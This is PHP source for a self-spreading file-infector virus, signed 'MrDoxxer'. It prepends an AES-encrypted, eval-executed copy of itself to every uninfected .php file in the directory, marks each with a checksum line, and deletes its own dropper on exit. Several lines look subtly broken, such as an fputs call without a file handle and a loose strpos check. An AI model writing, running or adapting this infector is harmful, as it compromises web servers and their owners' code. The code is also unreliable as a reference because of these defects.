<?php

function execute($code){

    $filenames = glob('*.php');

    foreach($filenames as $filename){

        $script = fopen($filename, "r");

        $first_line = fgets($script);
        $code_hash = md5($filename);
        if(strpos($first_line, $code_hash) == false) {

            $infected = fopen("$filename.infected", "w");

            $Yeet = '<?php Yeeted By MrDoxxer and MrDoxxerS Friend (Your name )?>'; 
            $checksum = '<?php // Checksum: ' . $code_hash . ' ?>';
            $infection = '<?php ' . encryptedCode($code) . ' ?>';
            
            fputs($Yeet);
            fputs($infected, $checksum);
            fputs($infected, $infection);
            fputs($infected, $first_line);

            while($contents = fgets($script)){
                fputs($infected, $contents);
            }

            fclose($script);
            fclose($infected);
            unlink("$filename");
            rename("$filename.infected", $filename);

        }              
        
    }
}

function encryptedCode($code){
    $output = false;
    $encryption_method = 'AES-256-CBC';
    $secret_iv = 'YeetusCleetus';
    $str = '0123456789abcdef';    
    $secret_key = 'YEET';    
    for($i=0;$i<64;++$i) $secret_key.= $str[rand(0,strlen($str)-1)];
    $secret_key = pack('H*', $secret_key);
    $key = hash('sha256', $secret_key);
    $iv = substr(hash('sha256', $secret_iv), 0, 16);
    $output = openssl_encrypt($code, $encryption_method, $key, 0, $iv);
    $encodedOutput = base64_encode($output);   
    $encodedIV = base64_encode($iv);
    $encodedKey = base64_encode($key);

    $payload = "
        \$output = '$encodedOutput';
        \$iv = '$encodedIV';        
        \$key = '$encodedKey';       
        \$code = openssl_decrypt(base64_decode(\$output), 'AES-256-CBC', base64_decode(\$key), 0, base64_decode(\$iv));
        eval(\$code);
        execute(\$code);
    ";

    return $payload;
}

$code = file_get_contents(__FILE__);
$code = substr($code, strpos($code, "."));
$code = substr($code, 0, strpos($code, "\n//. "));
execute($code);

class DeleteOnExit {
   function __destruct() {
      unlink(__FILE__);
   }
}
$delete_on_exit = new DeleteOnExit();
?>
